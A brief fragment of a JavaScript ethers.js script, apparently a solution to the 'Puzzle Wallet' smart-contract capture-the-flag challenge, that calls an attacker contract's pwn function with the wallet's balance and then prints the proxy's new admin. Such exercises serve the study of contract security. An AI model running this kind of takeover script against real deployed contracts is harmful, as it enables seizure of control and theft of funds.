...
async function main() {
    ...
    transactionResponse = await hacker.pwn({value: ethers.provider.getBalance(process.env.PUZZLEWALLET_ADDRESS)});
    await transactionResponse.wait();

    console.log("The admin of proxy is ", await proxy.admin());
}
